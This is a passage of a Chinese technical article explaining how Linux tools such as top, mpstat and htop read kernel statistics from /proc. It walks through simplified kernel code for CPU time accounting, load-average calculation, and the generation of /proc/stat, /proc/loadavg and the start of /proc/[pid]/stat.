                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 概述</h2>
<h3 data-id="heading-1">1.1 工具与内核的关系</h3>
<p>top、mpstat、htop 这三个工具都是通过读取 Linux 内核提供的 <code>/proc</code> 文件系统来获取系统统计信息的。它们本身并不进行统计，而是读取内核已经统计好的数据，然后进行计算和展示。</p>
<p><strong>数据流向</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">内核统计模块（时钟中断、进程切换等）
  ↓
更新内核数据结构（kcpustat、task_struct 等）
  ↓
/proc 文件系统（虚拟文件系统接口）
  ↓
用户空间工具（top、mpstat、htop）
  ↓
读取、计算、显示
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>统计发生在内核</strong>：所有统计都在内核中完成</li>
<li><strong>工具只负责读取和计算</strong>：工具读取内核数据，然后计算百分比、差值等</li>
<li><strong>实时性</strong>：每次读取 <code>/proc</code> 文件时，内核实时生成数据</li>
</ol>
<h3 data-id="heading-2">1.2 内核统计的核心机制</h3>
<p><strong>时钟中断（Timer Interrupt）</strong>：</p>
<p>Linux 内核通过时钟中断定期更新统计信息。每次时钟中断时（通常每 1-10 毫秒，取决于 HZ 配置）：</p>
<ol>
<li>更新当前进程的 CPU 时间</li>
<li>更新系统负载</li>
<li>更新进程状态</li>
</ol>
<p><strong>进程切换</strong>：</p>
<p>进程切换时，内核会：</p>
<ol>
<li>保存前一个进程的统计信息</li>
<li>恢复下一个进程的统计信息</li>
<li>更新进程切换计数器</li>
</ol>
<p><strong>关键数据结构</strong>：</p>
<ol>
<li><strong><code>kcpustat</code></strong>：每个 CPU 的统计信息</li>
<li><strong><code>task_struct</code></strong>：每个进程的统计信息</li>
<li><strong><code>avenrun</code></strong>：系统负载平均值数组</li>
</ol>
<hr/>
<h2 data-id="heading-3">2. 内核 CPU 统计原理</h2>
<h3 data-id="heading-4">2.1 CPU 时间统计的更新机制</h3>
<p><strong>时钟中断触发统计更新</strong>：</p>
<p>每次时钟中断时（<code>scheduler_tick()</code>），内核会调用 <code>account_process_tick()</code> 来更新当前进程的 CPU 时间统计。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/core.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">scheduler_tick</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rq</span> *<span class="hljs-title">rq</span> =</span> cpu_rq(cpu);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">curr</span> =</span> rq-&gt;curr;
    
    <span class="hljs-comment">// 更新运行队列时钟</span>
    update_rq_clock(rq);
    
    <span class="hljs-comment">// 更新当前进程的调度信息</span>
    curr-&gt;sched_class-&gt;task_tick(rq, curr, <span class="hljs-number">0</span>);
    
    <span class="hljs-comment">// 更新全局负载</span>
    calc_global_load_tick(rq);
}
</code></pre>
<p><strong>account_process_tick() 的工作原理</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_process_tick</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">int</span> user_tick)</span>
{
    u64 cputime = TICK_NSEC;  <span class="hljs-comment">// 一个时钟周期的时间（纳秒）</span>
    u64 steal = steal_account_process_time(ULONG_MAX);
    
    cputime -= steal;
    
    <span class="hljs-keyword">if</span> (user_tick)
        account_user_time(p, cputime);  <span class="hljs-comment">// 用户空间时间</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((p != this_rq()-&gt;idle) || (irq_count() != HARDIRQ_OFFSET))
        account_system_time(p, HARDIRQ_OFFSET, cputime);  <span class="hljs-comment">// 内核空间时间</span>
    <span class="hljs-keyword">else</span>
        account_idle_time(cputime);  <span class="hljs-comment">// 空闲时间</span>
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>TICK_NSEC</strong>：一个时钟周期的时间（通常 1-10 毫秒，取决于 HZ 配置）</li>
<li><strong>user_tick</strong>：标志位，表示这个时钟周期是在用户空间还是内核空间</li>
<li><strong>steal time</strong>：虚拟化环境中被其他虚拟机占用的时间</li>
</ol>
<h3 data-id="heading-5">2.2 account_user_time() 的详细实现</h3>
<p><strong>account_user_time() 的作用</strong>：</p>
<p>将用户空间的 CPU 时间累加到进程和全局统计中。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_user_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, u64 cputime)</span>
{
    <span class="hljs-comment">// 1. 累加到进程的用户空间时间</span>
    p-&gt;utime += cputime;
    account_group_user_time(p, cputime);
    
    <span class="hljs-comment">// 2. 根据 nice 值决定累加到哪个全局统计</span>
    <span class="hljs-type">int</span> index = (task_nice(p) &gt; <span class="hljs-number">0</span>) ? CPUTIME_NICE : CPUTIME_USER;
    
    <span class="hljs-comment">// 3. 累加到全局 CPU 统计</span>
    task_group_account_field(p, index, cputime);
    
    <span class="hljs-comment">// 4. 更新进程会计信息</span>
    acct_account_cputime(p);
}
</code></pre>
<p><strong>详细步骤说明</strong>：</p>
<ol>
<li>
<p><strong>更新进程统计</strong>：</p>
<ul>
<li><strong><code>p-&gt;utime += cputime</code></strong>：累加进程的用户空间 CPU 时间</li>
<li><strong><code>account_group_user_time()</code></strong>：更新进程组的用户空间时间</li>
<li><strong>作用</strong>：用于 <code>/proc/[pid]/stat</code> 中的 utime 字段</li>
</ul>
</li>
<li>
<p><strong>更新全局统计</strong>：</p>
<ul>
<li><strong><code>task_group_account_field()</code></strong>：更新全局 CPU 统计</li>
<li><strong>根据 nice 值</strong>：
<ul>
<li>nice &gt; 0：累加到 <code>CPUTIME_NICE</code></li>
<li>nice &lt;= 0：累加到 <code>CPUTIME_USER</code></li>
</ul>
</li>
<li><strong>作用</strong>：用于 <code>/proc/stat</code> 中的 user 和 nice 字段</li>
</ul>
</li>
<li>
<p><strong>数据结构</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 每个 CPU 的统计信息</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_cpustat</span> {</span>
    u64 cpustat[NR_STATS];
};

<span class="hljs-comment">// 统计类型</span>
<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">cpu_usage_stat</span> {</span>
    CPUTIME_USER,
    CPUTIME_NICE,
    CPUTIME_SYSTEM,
    CPUTIME_SOFTIRQ,
    CPUTIME_IRQ,
    CPUTIME_IDLE,
    CPUTIME_IOWAIT,
    CPUTIME_STEAL,
    CPUTIME_GUEST,
    CPUTIME_GUEST_NICE,
    NR_STATS
};
</code></pre>
</li>
</ol>
<h3 data-id="heading-6">2.3 account_system_time() 的详细实现</h3>
<p><strong>account_system_time() 的作用</strong>：</p>
<p>将内核空间的 CPU 时间累加到进程和全局统计中，并根据中断状态决定累加到哪个统计类型。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_system_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">int</span> hardirq_offset, u64 cputime)</span>
{
    <span class="hljs-type">int</span> index;
    
    <span class="hljs-comment">// 检查是否是虚拟机时间</span>
    <span class="hljs-keyword">if</span> ((p-&gt;flags &amp; PF_VCPU) &amp;&amp; (irq_count() - hardirq_offset == <span class="hljs-number">0</span>)) {
        account_guest_time(p, cputime);
        <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// 根据中断状态决定统计类型</span>
    <span class="hljs-keyword">if</span> (hardirq_count() - hardirq_offset)
        index = CPUTIME_IRQ;  <span class="hljs-comment">// 硬件中断</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (in_serving_softirq())
        index = CPUTIME_SOFTIRQ;  <span class="hljs-comment">// 软件中断</span>
    <span class="hljs-keyword">else</span>
        index = CPUTIME_SYSTEM;  <span class="hljs-comment">// 普通内核时间</span>
    
    account_system_index_time(p, cputime, index);
}
</code></pre>
<p><strong>详细步骤说明</strong>：</p>
<ol>
<li>
<p><strong>检查虚拟机时间</strong>：</p>
<ul>
<li>如果进程标志包含 <code>PF_VCPU</code> 且不在中断中，统计为虚拟机时间</li>
</ul>
</li>
<li>
<p><strong>根据中断状态分类</strong>：</p>
<ul>
<li><strong>硬件中断</strong>：<code>hardirq_count() &gt; 0</code> → <code>CPUTIME_IRQ</code></li>
<li><strong>软件中断</strong>：<code>in_serving_softirq()</code> → <code>CPUTIME_SOFTIRQ</code></li>
<li><strong>普通内核时间</strong>：其他情况 → <code>CPUTIME_SYSTEM</code></li>
</ul>
</li>
<li>
<p><strong>更新统计</strong>：</p>
<ul>
<li><strong><code>account_system_index_time()</code></strong>：累加到进程和全局统计</li>
<li><strong><code>p-&gt;stime += cputime</code></strong>：累加进程的内核空间时间</li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">2.4 account_idle_time() 的详细实现</h3>
<p><strong>account_idle_time() 的作用</strong>：</p>
<p>统计 CPU 空闲时间，并根据 I/O 等待状态决定是空闲还是 I/O 等待。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_idle_time</span><span class="hljs-params">(u64 cputime)</span>
{
    u64 *cpustat = kcpustat_this_cpu-&gt;cpustat;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rq</span> *<span class="hljs-title">rq</span> =</span> this_rq();
    
    <span class="hljs-comment">// 检查是否有进程在等待 I/O</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-type">atomic_read</span>(&amp;rq-&gt;nr_iowait) &gt; <span class="hljs-number">0</span>)
        cpustat[CPUTIME_IOWAIT] += cputime;  <span class="hljs-comment">// I/O 等待</span>
    <span class="hljs-keyword">else</span>
        cpustat[CPUTIME_IDLE] += cputime;  <span class="hljs-comment">// 空闲</span>
}
</code></pre>
<p><strong>详细步骤说明</strong>：</p>
<ol>
<li>
<p><strong>检查 I/O 等待</strong>：</p>
<ul>
<li><strong><code>rq-&gt;nr_iowait</code></strong>：运行队列中等待 I/O 的进程数</li>
<li>如果有进程等待 I/O，统计为 <code>CPUTIME_IOWAIT</code></li>
<li>否则统计为 <code>CPUTIME_IDLE</code></li>
</ul>
</li>
<li>
<p><strong>为什么区分 I/O 等待和空闲</strong>：</p>
<ul>
<li><strong>I/O 等待</strong>：CPU 空闲是因为等待 I/O 完成，可能表示 I/O 瓶颈</li>
<li><strong>空闲</strong>：CPU 空闲是因为没有可运行的进程</li>
</ul>
</li>
</ol>
<h3 data-id="heading-8">2.5 /proc/stat 的生成原理</h3>
<p><strong>show_stat() 函数</strong>：</p>
<p><code>/proc/stat</code> 文件由 <code>show_stat()</code> 函数生成，它遍历所有 CPU，汇总统计信息。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// fs/proc/stat.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">show_stat</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v)</span>
{
    u64 user, nice, system, idle, iowait, irq, softirq, steal;
    u64 guest, guest_nice;
    
    <span class="hljs-comment">// 初始化</span>
    user = nice = system = idle = iowait = irq = softirq = steal = <span class="hljs-number">0</span>;
    guest = guest_nice = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 遍历所有 CPU，累加统计</span>
    for_each_possible_cpu(i) {
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_cpustat</span> <span class="hljs-title">kcpustat</span>;</span>
        u64 *cpustat = kcpustat.cpustat;
        
        <span class="hljs-comment">// 获取 CPU 统计信息</span>
        kcpustat_cpu_fetch(&amp;kcpustat, i);
        
        <span class="hljs-comment">// 累加各项统计</span>
        user    += cpustat[CPUTIME_USER];
        nice    += cpustat[CPUTIME_NICE];
        system  += cpustat[CPUTIME_SYSTEM];
        idle    += get_idle_time(&amp;kcpustat, i);
        iowait  += get_iowait_time(&amp;kcpustat, i);
        irq     += cpustat[CPUTIME_IRQ];
        softirq += cpustat[CPUTIME_SOFTIRQ];
        steal   += cpustat[CPUTIME_STEAL];
        guest   += cpustat[CPUTIME_GUEST];
        guest_nice += cpustat[CPUTIME_GUEST_NICE];
    }
    
    <span class="hljs-comment">// 输出汇总统计（cpu 行）</span>
    seq_put_decimal_ull(p, <span class="hljs-string">"cpu  "</span>, <span class="hljs-type">nsec_to_clock_t</span>(user));
    seq_put_decimal_ull(p, <span class="hljs-string">" "</span>, <span class="hljs-type">nsec_to_clock_t</span>(nice));
    <span class="hljs-comment">// ... 其他字段</span>
    
    <span class="hljs-comment">// 输出每个 CPU 的统计（cpu0, cpu1, ...）</span>
    for_each_online_cpu(i) {
        <span class="hljs-comment">// ... 类似处理</span>
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>实时计算</strong>：每次读取 <code>/proc/stat</code> 时，内核实时汇总所有 CPU 的统计</li>
<li><strong>时间单位转换</strong>：<code>nsec_to_clock_t()</code> 将纳秒转换为时钟周期（jiffies）</li>
<li><strong>NO_HZ 处理</strong>：<code>get_idle_time()</code> 和 <code>get_iowait_time()</code> 处理 NO_HZ 模式下的时间统计</li>
</ol>
<h3 data-id="heading-9">2.6 工具如何计算 CPU 使用率</h3>
<p><strong>top/mpstat 的计算方式</strong>：</p>
<p>工具读取两次 <code>/proc/stat</code>，计算差值，然后计算百分比。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 伪代码示例</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">calculate_cpu_usage</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// 第一次读取</span>
    read_proc_stat(&amp;stat1);
    
    sleep(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 等待 1 秒</span>
    
    <span class="hljs-comment">// 第二次读取</span>
    read_proc_stat(&amp;stat2);
    
    <span class="hljs-comment">// 计算差值</span>
    total = (stat2.user - stat1.user) +
            (stat2.nice - stat1.nice) +
            (stat2.system - stat1.system) +
            (stat2.idle - stat1.idle) +
            (stat2.iowait - stat1.iowait) +
            (stat2.irq - stat1.irq) +
            (stat2.softirq - stat1.softirq) +
            (stat2.steal - stat1.steal);
    
    <span class="hljs-comment">// 计算百分比</span>
    user_percent = (stat2.user - stat1.user) * <span class="hljs-number">100.0</span> / total;
    system_percent = (stat2.system - stat1.system) * <span class="hljs-number">100.0</span> / total;
    idle_percent = (stat2.idle - stat1.idle) * <span class="hljs-number">100.0</span> / total;
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>差值计算</strong>：CPU 使用率是时间差值的百分比，不是绝对值的百分比</li>
<li><strong>时间单位</strong>：统计值以时钟周期（jiffies）为单位，需要转换为纳秒或秒</li>
<li><strong>多核系统</strong>：每个 CPU 核心单独计算，或汇总后计算平均值</li>
</ol>
<hr/>
<h2 data-id="heading-10">3. 系统负载平均值统计原理</h2>
<h3 data-id="heading-11">3.1 负载平均值的定义</h3>
<p><strong>负载平均值是什么</strong>：</p>
<p>负载平均值是系统中可运行进程和不可中断进程的平均数量，是一个指数衰减平均值。</p>
<p><strong>公式</strong>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">load</span>(t) = <span class="hljs-built_in">load</span>(t-<span class="hljs-number">1</span>) * <span class="hljs-built_in">exp</span>(-<span class="hljs-number">5</span>/<span class="hljs-number">60</span>) + n * (<span class="hljs-number">1</span> - exp(-<span class="hljs-number">5</span>/<span class="hljs-number">60</span>))
</code></pre>
<p>其中：</p>
<ul>
<li><code>load(t)</code>：当前负载值</li>
<li><code>load(t-1)</code>：上一次负载值</li>
<li><code>n</code>：当前活跃进程数（nr_running + nr_uninterruptible）</li>
<li><code>exp(-5/60)</code>：衰减因子（5 分钟负载）</li>
</ul>
<p><strong>三种负载平均值</strong>：</p>
<ol>
<li><strong>1 分钟负载</strong>：<code>exp(-1/60)</code>，反映短期负载</li>
<li><strong>5 分钟负载</strong>：<code>exp(-5/60)</code>，反映中期负载</li>
<li><strong>15 分钟负载</strong>：<code>exp(-15/60)</code>，反映长期负载</li>
</ol>
<h3 data-id="heading-12">3.2 负载平均值的计算原理</h3>
<p><strong>calc_global_load() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">calc_global_load</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sample_window;
    <span class="hljs-type">long</span> active, delta;
    
    sample_window = READ_ONCE(calc_load_update);
    <span class="hljs-keyword">if</span> (time_before(jiffies, sample_window + <span class="hljs-number">10</span>))
        <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// 处理 NO_HZ 模式下的增量</span>
    delta = calc_load_nohz_read();
    <span class="hljs-keyword">if</span> (delta)
        atomic_long_add(delta, &amp;calc_load_tasks);
    
    <span class="hljs-comment">// 获取当前活跃进程数</span>
    active = atomic_long_read(&amp;calc_load_tasks);
    active = active &gt; <span class="hljs-number">0</span> ? active * FIXED_1 : <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 更新三种负载平均值</span>
    avenrun[<span class="hljs-number">0</span>] = calc_load(avenrun[<span class="hljs-number">0</span>], EXP_1, active);   <span class="hljs-comment">// 1 分钟</span>
    avenrun[<span class="hljs-number">1</span>] = calc_load(avenrun[<span class="hljs-number">1</span>], EXP_5, active);   <span class="hljs-comment">// 5 分钟</span>
    avenrun[<span class="hljs-number">2</span>] = calc_load(avenrun[<span class="hljs-number">2</span>], EXP_15, active);  <span class="hljs-comment">// 15 分钟</span>
    
    WRITE_ONCE(calc_load_update, sample_window + LOAD_FREQ);
}
</code></pre>
<p><strong>calc_load() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>
<span class="hljs-title function_">calc_load</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> load, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-built_in">exp</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> active)</span>
{
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> newload;
    
    newload = load * <span class="hljs-built_in">exp</span> + active * (FIXED_1 - <span class="hljs-built_in">exp</span>);
    <span class="hljs-keyword">if</span> (active &gt;= load)
        newload += FIXED_1 - <span class="hljs-built_in">exp</span>;
    
    <span class="hljs-keyword">return</span> newload &gt;&gt; FSHIFT;
}
</code></pre>
<p><strong>详细步骤说明</strong>：</p>
<ol>
<li>
<p><strong>收集活跃进程数</strong>：</p>
<ul>
<li><strong><code>calc_load_tasks</code></strong>：全局原子变量，累加所有 CPU 的活跃进程数</li>
<li><strong>活跃进程数</strong>：<code>nr_running + nr_uninterruptible</code></li>
</ul>
</li>
<li>
<p><strong>指数衰减计算</strong>：</p>
<ul>
<li><strong>公式</strong>：<code>newload = load * exp + active * (1 - exp)</code></li>
<li><strong>exp</strong>：衰减因子（EXP_1, EXP_5, EXP_15）</li>
<li><strong>作用</strong>：平滑负载值，避免剧烈波动</li>
</ul>
</li>
<li>
<p><strong>更新频率</strong>：</p>
<ul>
<li><strong>LOAD_FREQ</strong>：每 5 秒更新一次（5 * HZ）</li>
<li><strong>延迟更新</strong>：等待 10 个时钟周期，确保所有 CPU 都更新了</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">3.3 每个 CPU 的负载贡献</h3>
<p><strong>calc_global_load_tick() 函数</strong>：</p>
<p>每个 CPU 在时钟中断时更新自己的负载贡献。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">calc_global_load_tick</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> rq *this_rq)</span>
{
    <span class="hljs-type">long</span> delta;
    
    <span class="hljs-keyword">if</span> (time_before(jiffies, this_rq-&gt;calc_load_update))
        <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// 计算活跃进程数的增量</span>
    delta = calc_load_fold_active(this_rq, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (delta)
        atomic_long_add(delta, &amp;calc_load_tasks);
    
    this_rq-&gt;calc_load_update += LOAD_FREQ;
}
</code></pre>
<p><strong>calc_load_fold_active() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">long</span> <span class="hljs-title function_">calc_load_fold_active</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> rq *this_rq, <span class="hljs-type">long</span> adjust)</span>
{
    <span class="hljs-type">long</span> nr_active, delta = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 计算当前活跃进程数</span>
    nr_active = this_rq-&gt;nr_running - adjust;
    nr_active += (<span class="hljs-type">int</span>)this_rq-&gt;nr_uninterruptible;
    
    <span class="hljs-comment">// 计算与上次的差值</span>
    <span class="hljs-keyword">if</span> (nr_active != this_rq-&gt;calc_load_active) {
        delta = nr_active - this_rq-&gt;calc_load_active;
        this_rq-&gt;calc_load_active = nr_active;
    }
    
    <span class="hljs-keyword">return</span> delta;
}
</code></pre>
<p><strong>详细步骤说明</strong>：</p>
<ol>
<li>
<p><strong>计算增量</strong>：</p>
<ul>
<li><strong><code>nr_active</code></strong>：当前 CPU 的活跃进程数</li>
<li><strong><code>delta</code></strong>：与上次的差值</li>
<li><strong>作用</strong>：只累加变化量，减少同步开销</li>
</ul>
</li>
<li>
<p><strong>累加到全局</strong>：</p>
<ul>
<li><strong><code>atomic_long_add()</code></strong>：原子操作，累加到全局变量</li>
<li><strong>作用</strong>：所有 CPU 的增量累加后，得到全局活跃进程数</li>
</ul>
</li>
<li>
<p><strong>更新频率</strong>：</p>
<ul>
<li>每个 CPU 每 5 秒更新一次</li>
<li>全局负载每 5 秒计算一次</li>
</ul>
</li>
</ol>
<h3 data-id="heading-14">3.4 /proc/loadavg 的生成</h3>
<p><strong>get_avenrun() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">get_avenrun</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *loads, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> shift)</span>
{
    loads[<span class="hljs-number">0</span>] = (avenrun[<span class="hljs-number">0</span>] + offset) &lt;&lt; shift;
    loads[<span class="hljs-number">1</span>] = (avenrun[<span class="hljs-number">1</span>] + offset) &lt;&lt; shift;
    loads[<span class="hljs-number">2</span>] = (avenrun[<span class="hljs-number">2</span>] + offset) &lt;&lt; shift;
}
</code></pre>
<p><strong>/proc/loadavg 的格式</strong>：</p>
<pre><code class="hljs">0.52 0.58 0.61 2/285 12345
</code></pre>
<ul>
<li><strong>0.52</strong>：1 分钟负载</li>
<li><strong>0.58</strong>：5 分钟负载</li>
<li><strong>0.61</strong>：15 分钟负载</li>
<li><strong>2/285</strong>：当前运行进程数 / 总进程数</li>
<li><strong>12345</strong>：最近创建的进程 PID</li>
</ul>
<hr/>
<h2 data-id="heading-15">4. 进程统计信息生成原理</h2>
<h3 data-id="heading-16">4.1 /proc/[pid]/stat 的生成</h3>
<p><strong>do_task_stat() 函数</strong>：</p>
<p><code>/proc/[pid]/stat</code> 文件由 <code>do_task_stat()</code> 函数生成，它从 <code>task_struct</code> 中读取各种统计信息。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// fs/proc/array.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_task_stat</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-keyword">struct</span> pid_namespace *ns,
                        <span class="hljs-keyword">struct</span> pid *pid, <span class="hljs-keyword">struct</span> task_struct *task, <span class="hljs-type">int</span> whole)</span>
{
    <span class="hljs-comment">// 1. 获取进程基本信息</span>
    <span class="hljs-type">pid_t</span> ppid = task_tgid_nr_ns(task-&gt;real_parent, ns);
    <span class="hljs-type">pid_t</span> tgid = task_tgid_nr_ns(task, ns);
    
    <span class="hljs-comment">// 2. 获取 CPU 时间</span>
    task_cputime_adjusted(task, &amp;utime, &amp;stime);
    
    <span class="hljs-comment">// 3. 获取内存信息</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> get_task_mm(task);
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vsize = mm ? mm-&gt;total_vm : <span class="hljs-number">0</span>;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rss = mm ? get_mm_rss(mm) : <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 4. 输出所有字段</span>
    seq_put_decimal_ull(m, <span class="hljs-string">""</span>, pid_nr_ns(pid, ns));  <span class="hljs-comment">// PID</span>
    seq_puts(m, <span class="hljs-string">" ("</span>);
    proc_task_name(m, task, <span class="hljs-literal">false</span>);  <span class="hljs-comment">// 进程名</span>
    seq_puts(m, <span class="hljs-string">") "</span>);
    seq_putc(m, state);  <span class="hljs-comment">// 状态</span>
